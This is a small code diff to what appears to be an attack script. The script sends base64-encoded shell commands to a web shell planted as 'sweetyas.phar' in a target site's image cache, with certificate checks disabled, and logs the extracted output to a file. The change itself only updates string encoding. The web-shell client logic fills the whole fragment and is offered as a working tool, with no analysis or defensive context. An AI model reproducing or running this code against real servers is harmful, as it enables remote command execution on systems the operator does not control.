@@ -37,7 +37,8 @@ url = sys.argv[1] + "/cache/images/sweetyas.phar"
 
 
 cmd = "ls"
-res = requests.post(url, data={"c": base64.b64encode(cmd)}, verify=False)
+data_bytes = cmd.encode("utf-8")
+res = requests.post(url, data={"c": base64.b64encode(data_bytes)}, verify=False)
 res = re.search("#####(.*)#####", res.text, re.DOTALL)
 if res:
 	with open('1.txt', 'a') as file:
